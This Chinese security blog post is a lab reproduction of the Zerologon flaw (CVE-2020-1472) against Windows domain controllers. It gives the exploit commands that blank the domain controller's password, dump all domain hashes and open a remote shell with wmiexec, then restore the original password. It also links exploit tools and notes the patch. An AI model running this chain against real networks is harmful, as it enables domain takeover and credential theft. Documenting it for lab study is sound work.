
<!DOCTYPE html>
<html lang="zh-Hans">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
        <title>CVE-2020-1472：Zerologon域控提权 | 小C♥天天</title>
        <meta name="author" content="小C&天天">
        <meta name="description" content="^v^">
        <meta name="keywords" content="">
        <link rel="icon" href="/images/icon.jpg">
        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
        <link rel="stylesheet" href="/css/fonts.min.css">
        <link rel="stylesheet" href="/css/particlex.css">
        <link rel="stylesheet" href="/css/main.css">
        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
        <script src="https://cdn.staticfile.org/pixi.js/4.6.1/pixi.min.js"></script>
        <link rel="stylesheet" href="/css/style.css">
    <meta name="generator" content="Hexo 6.2.0"></head>
    <body>
        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:30vmin;height:30vmin;padding:60px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #dd20dd;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">正在加载</p><div><img alt="loading" src="/images/afde9fa65a5742a90b51d6e1211e841e.gif"></div></div></div></div></div>
        <div id="layout">
            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
            <transition name="into">
                <div v-show="show_page" style="display: -not-none">
                    <div id="menu_show">
                         
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">小C♥天天</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;主页</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;关于</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;文章</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;分类</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;标签</span>
        </a>
        
        <form class="search">
            <input type="text" placeholder="需要搜索什么？">
            <button type="submit"></button>
        </form>
    </div>
    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
        <div :class="'title'" @click="menu_show = !menu_show">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;小C♥天天</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="menu_show">
            
            <a href="/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
                </div>
            </a>
            
            <a href="/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
                </div>
            </a>
            
            <a href="/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">文章</div>
                </div>
            </a>
            
            <a href="/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
                </div>
            </a>
            
            <a href="/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>
                    </div>
                    <div id="main">
                        
<div class="article">
    <div>
        <h1>CVE-2020-1472：Zerologon域控提权 </h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
            </span>
            2022/10/21
        </span>
        
        <span class="category">
            <a href="/categories/漏洞复现">
                <span class="icon">
                    <svg class="fa-icon"><use xlink:href="#bookmark-solid"></use></svg>
                </span>
                漏洞复现
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
            </span>
            
            <span class="tag">
                
                <a href="/tags/域" style="color: #00bcd4">
                    域
                </a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/提权" style="color: #ff7d73">
                    提权
                </a>
            </span>
            
        </span>
        
    </div>
    <div class="content" v-pre>
        <h1 id="壹-漏洞概念"><a href="#壹-漏洞概念" class="headerlink" title="壹 漏洞概念"></a>壹 漏洞概念</h1><p>CVE-2020-1472 是⼀个Windows域控中严重的远程权限提升漏洞，该漏洞也称为“Zerologon”，CVSS评分为10.0，号称3秒撸穿域控，危害严重。</p>
<span id="more"></span>
<h1 id="贰-漏洞原理及利用条件"><a href="#贰-漏洞原理及利用条件" class="headerlink" title="贰 漏洞原理及利用条件"></a>贰 漏洞原理及利用条件</h1><p>CVE-2020-1472 是⼀个Windows域控中严重的远程权限提升漏洞，攻击者通过 NetLogon（MS-NRPC）协议与AD域控建立安全通道时，可利⽤此漏洞将域控中保存在AD中的管理员password设置为空，获取域管访问权限；其漏洞原理是发⽣在 RPC 认证过程的过程中，由于错误的使⽤了 AES-CFB8 加密所导致漏洞成因。</p>
<p><font color="red">注意：在实战环境中，由于会把域控机器的账户和密码清空，所以有可能会导致域内出问题，可能导致某些服务⽆法正常运⾏，严重会造成脱域等情况，请谨慎利⽤。</font></p>
<h1 id="叁-适用版本"><a href="#叁-适用版本" class="headerlink" title="叁 适用版本"></a>叁 适用版本</h1><p>该漏洞适⽤于 Win2008 后的所有版本。</p>
<pre><code>Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)
</code></pre>
<h1 id="肆-复现环境说明"><a href="#肆-复现环境说明" class="headerlink" title="肆 复现环境说明"></a>肆 复现环境说明</h1><p>域控：<code>windows server 2019 Essentials（10.0.10.110）</code>，开启防火墙<br>域控：<code>windows server 2016 Datacenter（10.0.10.111）</code><br>域名：<code>vulntarget.com</code></p>
<p>利用场景：获取了一个加入了域的计算机权限，在域普通账号的情况下，将域管密码置空，导出域管hash，然后进行连接。</p>
<h1 id="伍-复现"><a href="#伍-复现" class="headerlink" title="伍 复现"></a>伍 复现</h1><h2 id="5-1-CVE-2020-1472复现"><a href="#5-1-CVE-2020-1472复现" class="headerlink" title="5.1 CVE-2020-1472复现"></a>5.1 CVE-2020-1472复现</h2><pre><code># 使用下面命令获取域控
net group &quot;domain controllers&quot; /domain
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/4060619e1bf49150f8d5bdf4e05aa298.png" alt="4060619e1bf49150f8d5bdf4e05aa298.png"></p>
<p>使用<code>zerologon_tester.py</code>检测是否存在漏洞（这个漏洞最好先检测一下，因为直接使用EXP会导致域管置空）</p>
<pre><code>python zerologon_tester.py 域控主机名 域控ip
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/dff26a18b9691054d661fc9cdedac400.png" alt="dff26a18b9691054d661fc9cdedac400.png"><br>这里用的是内网环境，所以加了<code>proxychains4</code>进行代理，最后输出：<br><img src="/images/%E5%A4%8D%E7%8E%B0/821ab6ae6386d5ec67c2b91d9a707470.png" alt="821ab6ae6386d5ec67c2b91d9a707470.png"><br>返回 Success，说明漏洞很可能存在！</p>
<p>接着使用工具<code>cve-2020-1472-exploit.py</code>，置空DC密码：</p>
<pre><code>python3 cve-2020-1472-exploit.py 域控主机名 域控ip
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/e0b8b3f98e6326998ee586ee63cb5152.png" alt="e0b8b3f98e6326998ee586ee63cb5152.png"><br>最后使用<code>secretsdum.py</code>（该攻击在<code>impacket-master/examples/</code>下）导出域内所有用户的凭证，因为置空了密码，所以这里无需密码就能导出hash：</p>
<pre><code># 需要注意这里格式是域名/域控主机名\$@域控ip
# 需要将impacket-master的所有的库下载，否则可能报错
python3 secretsdump.py 域名/域控主机名\$@域控ip -no-pass
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/5c022167b6bd693248b5f35ef354b15e.png" alt="5c022167b6bd693248b5f35ef354b15e.png"></p>
<p>最最后使用<code>smbexec.py</code>（该攻击在<code>impacket-master/examples/</code>下），获得域控终端：</p>
<pre><code>python3 wmiexec.py -hashes hash值 域控用户名@域控ip
# 当然也可以用smbexec.py、psexec.py
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/cbb9ea3939abedd4e80b7bf5c614f8f7.png" alt="cbb9ea3939abedd4e80b7bf5c614f8f7.png"></p>
<h2 id="5-2-恢复域控原始hash"><a href="#5-2-恢复域控原始hash" class="headerlink" title="5.2 恢复域控原始hash"></a>5.2 恢复域控原始hash</h2><p>导出 <code>sam system</code> 等⽂件到本地，获取域控机器上本地保存之前的 <code>hash</code> 值⽤于恢复，不然就脱域了：</p>
<pre><code>reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/a8de7b60140686400c23d827e4279612.png" alt="a8de7b60140686400c23d827e4279612.png"><br>然后将这三个文件下载下来（假设已经下载下来了），删除文件：</p>
<pre><code>del /f system.save
del /f sam.save
del /f security.save
</code></pre>
<p>之后通过<code>sam.save</code>、<code>security.save</code>、<code>system.save</code>这些⽂件获得原来域控机器上的<code>Ntlm Hash</code>值，⽤于恢复密码，在kali上运行<code>secretsdump.py</code>脚本（该攻击在<code>impacket-master/examples/</code>下）：</p>
<pre><code>python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/265fe16451d6df542910d0ed24eb5a6f.png" alt="265fe16451d6df542910d0ed24eb5a6f.png"><br>我们获得了<code>$MACHINE.ACC:</code>的值，然后使用<a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py"><code>reinstall_original_pw.py</code></a>进⾏恢复：</p>
<pre><code># 需要注意这里最后的参数要的是$MACHINE.ACC后半部分的值
# 例如例子中的$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:927882c9c7f9a92e8aa7d385ec0f2023
# 取927882c9c7f9a92e8aa7d385ec0f2023这一段
python3 reinstall_original_pw.py 域控机器名 域控ip $MACHINE.ACC后半部分的值
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/3913ccff4f3d0becad8c8643dbdbea98.png" alt="3913ccff4f3d0becad8c8643dbdbea98.png"><br><img src="/images/%E5%A4%8D%E7%8E%B0/7d3fb1f0acdc1443118fd8e8f1facec5.png" alt="7d3fb1f0acdc1443118fd8e8f1facec5.png"><br><font color="red">注意：这里域控机器名不能加$，显示了success也不一定成功，需要用脚本验证一下！</font></p>
<p>在使用开始的<code>secretsdum.py</code>导出域内所有用户的凭证，可见使用空密码去获取域内的所有用户的凭证已经不行了：</p>
<pre><code>python3 secretsdump.py 域名/域控主机名\$@域控ip -no-pass
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/08740de7447934110756b64075de97bf.png" alt="08740de7447934110756b64075de97bf.png"></p>
<p><font color="red">注意：别在实战中重置了域控的密码为空，结果不会还原导致目标脱域了，就BBQ了！！！！</font></p>
<h1 id="陆-利用Poc-Exp以及工具"><a href="#陆-利用Poc-Exp以及工具" class="headerlink" title="陆 利用Poc|Exp以及工具"></a>陆 利用Poc|Exp以及工具</h1><p><a href="/tools/%E5%A4%8D%E7%8E%B0/CVE-2020-1472%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83.zip">CVE-2020-1472域控提权.zip</a><br><a href="/tools/%E5%A4%8D%E7%8E%B0/impacket%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%B7%A5%E5%85%B7%E5%8C%85impacket.zip">impacket网络协议工具包impacket.zip</a><br><a href="/tools/%E5%A4%8D%E7%8E%B0/reinstall_original_pw.py">reinstall_original_pw.py</a></p>
<h1 id="柒-危害"><a href="#柒-危害" class="headerlink" title="柒 危害"></a>柒 危害</h1><p>CVSS评分为10.0，号称3秒撸穿域控，危害严重。</p>
<h1 id="捌-修复建议"><a href="#捌-修复建议" class="headerlink" title="捌 修复建议"></a>捌 修复建议</h1><p>建议点击以下链接自行寻找符合操作系统版本的漏洞补丁，并进行补丁下载安装。</p>
<pre><code>https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1472
</code></pre>
<h1 id="玖-参考"><a href="#玖-参考" class="headerlink" title="玖 参考"></a>玖 参考</h1><ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/xhwfa/article/details/123497241">CVE-2020-1472域内提权漏洞</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/123566796">域内提权之CVE-2020-1472复现打域控</a></li>
</ul>

    </div>
    
</div>
                         
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 2022 - 2023 小C♥天天
            <span class="footer-icon">
                <i class="fa-brands fa-github fa-fw"></i>
            </span>
            @小C&天天
        </div>
        <div>
            备案号：小C&天天の窝
        </div>
    </div>
</footer>
                    </div>
                </div>
            </transition>
            <div id="img_show">
                <img id="img_content" alt="img_show">
            </div>
        </div>
        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
        <script src="/js/particlex.js"></script>
        <script src="/js/showimg.js"></script>
        

        <!-- 3D模型 -->
        <div id="L2dCanvas" style="position: relative;"></div>
        <script src="/js/live2d.min.js"></script>
        <script src="/css/live2d.css"></script>
        <script>
            var v = new Viewer({
                basePath: "/model",
                role: "zhala_2",
                mobile: true,
            });
        </script>
        <!-- 点击 -->
        <script>
            let body = document.getElementsByTagName('body')[0];
            body.addEventListener('click', (e) => {
                let contentArr = ['✊','😘','😍','😊','😭','😡','😋','👍','🐷','😱','💷','💵','×','🆗','№','⭐','🌙','♥','💴','☀','🐎','🐂','🐏','√'];
                let randomNum = function (n) {
                    return Math.floor(Math.random() * n)
                }
                let span = document.createElement('span');
                span.innerHTML = `${contentArr[randomNum(contentArr.length)]}`;
                span.style.color = `rgb(${randomNum(256)},${randomNum(256)},${randomNum(256)})`;
                span.style.position = 'absolute';
                span.style.top = `${e.pageY}px`;
                span.style.left = `${e.pageX}px`;
                span.style.transition = 'all 1s ease';
                span.style.zIndex = 20000;
                body.appendChild(span)
                setTimeout(()=>{
                    span.style.top = span.offsetTop - 100 + 'px';
                    span.style.opacity = 0;
                    setTimeout(()=>{span.remove()},700)
                },0)
            })
        </script>
        <!-- 流星背景特效 -->
        <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1"></canvas>
        <script src="/js/background.js"></script>
    </body>
</html>